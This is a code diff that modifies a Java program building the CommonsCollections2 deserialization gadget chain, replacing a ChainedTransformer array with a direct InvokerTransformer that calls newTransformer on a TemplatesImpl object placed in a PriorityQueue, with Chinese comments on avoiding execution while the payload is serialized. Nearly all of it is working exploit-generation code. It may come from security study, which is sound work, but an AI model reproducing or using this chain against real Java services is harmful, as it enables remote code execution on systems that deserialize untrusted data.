@@ -17,12 +17,18 @@ import java.util.Base64;
 import java.util.PriorityQueue;
 
 
-public class CommonsCollections2_Simple_WithTransformerArray {
+public class CommonsCollections2_Simple_InvokerTransformer_WithoutArray {
 
     private static void setFiledValue(Object obj, String fieldName, Object fieldValue) throws Exception {
         Field field = obj.getClass().getDeclaredField(fieldName);
         field.setAccessible(true);
         field.set(obj, fieldValue);
+    }
+
+    private static Object getFiledValue(Object obj, String fieldName) throws Exception {
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        return field.get(obj);
     }
 
     public static void main(String[] args) {
@@ -36,27 +42,25 @@ public class CommonsCollections2_Simple_WithTransformerArray {
             setFiledValue(templatesObj, "_name", "whatever");
             setFiledValue(templatesObj, "_tfactory", new TransformerFactoryImpl());
 
-            Transformer[] transformers = new Transformer[]{
-                new ConstantTransformer(templatesObj),
-                new InvokerTransformer("newTransformer", new Class[0], new Object[0]),
-            };
+            InvokerTransformer evilTransformer = new InvokerTransformer(
+                "newTransformer", new Class[0], new Object[0]);
 
-            Transformer tmpTransformer = new ConstantTransformer(1);
+            Transformer tmpTransformer = new InvokerTransformer(
+                "toString", new Class[0], new Object[0]);
 
             /**
              * 因为PriorityQueue#add()操作也会触发比较器的比较操作：
              *   TransformingComparator#compare()
              *
-             * 所以为了避免生成序列化数据的过程中触发命令执行，先构造一个无害的ChainedTransformer
+             * 所以为了避免生成序列化数据的过程中触发命令执行，先构造一个无害的Transformer
              */
-            Transformer transformerChain = new ChainedTransformer(tmpTransformer);
 
-            TransformingComparator comparator = new TransformingComparator(transformerChain);
+            TransformingComparator comparator = new TransformingComparator(tmpTransformer);
             PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
-            queue.add(1);
-            queue.add(2);
+            queue.add(templatesObj);
+            queue.add(templatesObj);
 
-            setFiledValue(transformerChain, "iTransformers", transformers);
+            setFiledValue(comparator, "transformer", evilTransformer);
 
             ByteArrayOutputStream baos = new ByteArrayOutputStream();
             ObjectOutputStream oos = new ObjectOutputStream(baos);
